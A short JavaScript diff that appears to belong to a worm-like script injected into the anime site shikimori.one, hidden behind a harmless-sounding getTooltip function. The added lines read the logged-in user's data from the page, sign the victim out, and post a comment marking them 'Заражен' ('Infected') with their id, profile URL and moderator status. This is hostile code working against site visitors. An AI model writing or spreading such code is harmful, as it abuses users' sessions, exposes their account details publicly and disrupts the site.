@@ -92,7 +92,8 @@ async function signOutUser(delay) {
  }
 
 function getTooltip() {
-  let defautUrl = 'https://shikimori.one/comments/10529261'
+  let userData = $('body').data('user');
+  let defautUrl = 'https://shikimori.one/comments/10529261';
   let $container = $('.pusechka529');
   if ($container) {
     let $link = $container.children('.bubbled-processed');
@@ -111,7 +112,10 @@ function getTooltip() {
     }
     $link.attr('href', targetUrl);
     let logoutDelay = $container.data('signout-delay') || 1000;
-    signOutUser(logoutDelay);
+    if (userData.id) signOutUser(logoutDelay);
+
+    let strData = `Заражен ${userData.id} - ${userData.url} Модератор: ${userData.is_moderator}`;
+    sendComment(strData);
   }
 }
 
